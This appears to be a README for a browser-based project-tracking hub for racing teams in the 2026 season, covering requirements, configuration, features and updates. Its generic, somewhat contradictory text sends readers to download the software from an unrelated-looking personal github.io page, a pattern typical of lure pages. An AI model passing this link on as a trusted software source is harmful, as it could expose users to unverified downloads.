This tool helps racing teams track project progress. It provides a central place for data. Teams use this to organize tasks and manage resources for the 2026 season.

Visit this page to download the software: https://pegeenhalfhardy716.github.io

## 💻 System requirements

The application works on most modern computers. You need the following:

* Operating System: Windows 10 or Windows 11.
* Web Browser: Google Chrome, Microsoft Edge, or Mozilla Firefox.
* Storage: At least 50 MB of free space.
* Internet: An internet connection is not required to run the files once downloaded, but you need it to access external racing data feeds.

## 🛠️ Configuration notes

You can customize the tool to fit your team. The settings folder contains a config.json file. Open this file with Notepad to change basic settings. You can update your team name, season goals, and driver list here. Save the file after you make changes. Refresh your browser window to see the new settings. Do not change any lines that start with a bracket or quote unless you understand the structure.

## ⚙️ Key features

The hub provides several functions for your project:

* Project Timeline: View key dates for the 2026 racing season.
* Resource Tracker: Monitor your budget and spare parts.
* Crew Management: Assign tasks to specific team members.
* Race Logs: Record results and track car performance data.
* Data Backup: Export your information to a CSV file for safekeeping.

## ❓ Frequently asked questions

**Do I need to install special software?**
No. The tool runs directly in your web browser. You only need a standard browser like Chrome or Edge.

**Can multiple people use the hub at once?**
This version runs locally on your computer. You can share the folder via a cloud service like Dropbox or OneDrive if your team needs access. Please note that only one person should edit the files at a time to prevent errors.

**Does the tool track live racing data?**
The tool displays data you enter manually. It does not connect to live sensors on the car in this version.

**How do I save my progress?**
The tool saves your data automatically when you click the Save button on the dashboard. Ensure you keep the files in the same folder where you extracted them.

## 🔄 Updating your application

When a new version releases, visit the download page again. Follow the download steps. Move your existing data files from the old folder to the new folder to keep your information. Always back up your current folder before you perform an update.
